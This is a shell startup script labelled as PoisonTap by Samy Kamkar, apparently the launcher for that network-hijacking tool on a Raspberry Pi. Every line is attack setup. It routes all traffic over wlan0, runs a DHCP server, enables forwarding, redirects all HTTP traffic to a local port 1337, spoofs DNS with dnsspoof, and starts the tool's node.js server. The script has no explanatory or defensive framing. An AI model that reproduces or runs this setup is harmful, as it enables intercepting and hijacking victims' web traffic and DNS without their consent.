#!/bin/sh
#
# PoisonTap
#  by samy kamkar
#  http://samy.pl/poisontap
#  01/08/2016
#
ifup wlan0
ifconfig wlan0 up
/sbin/route add -net 0.0.0.0/0 wlan0
/etc/init.d/isc-dhcp-server start

/sbin/sysctl -w net.ipv4.ip_forward=1
/sbin/iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337
/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i wlan0 port 53
/usr/bin/screen -dmS node /usr/bin/nodejs /home/pi/poisontap/pi_poisontap.js

